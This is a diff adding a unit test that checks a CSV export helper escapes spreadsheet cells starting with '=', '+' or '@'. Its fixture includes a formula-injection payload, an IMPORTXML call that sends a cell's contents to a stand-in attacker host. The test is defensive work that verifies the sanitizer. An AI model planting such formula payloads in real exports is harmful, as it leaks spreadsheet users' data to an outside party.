@@ -44,6 +44,30 @@ describe("buildCsvWithPreamble", () => {
     const lines = csv.split("\n");
     expect(lines[2]).toBe(",");
   });
+
+  it("neutralizes formula-leading spreadsheet cells before CSV quoting", () => {
+    const csv = buildCsvWithPreamble(
+      [
+        {
+          symbol: '=IMPORTXML("https://attacker.example/?q="&A1)',
+          mechanism: "+malicious",
+          spaced: "  @malicious",
+          ordinaryNegativeNumber: -1,
+        },
+      ],
+      [
+        { header: "Symbol", accessor: (row) => row.symbol },
+        { header: "Mechanism", accessor: (row) => row.mechanism },
+        { header: "Spaced", accessor: (row) => row.spaced },
+        { header: "OrdinaryNegativeNumber", accessor: (row) => row.ordinaryNegativeNumber },
+      ],
+      PREAMBLE,
+    );
+
+    expect(csv.split("\n")[2]).toBe(
+      '"\'=IMPORTXML(""https://attacker.example/?q=""&A1)",\'+malicious,\'  @malicious,-1',
+    );
+  });
 });
 
 describe("downloadCsvWithPreamble", () => {
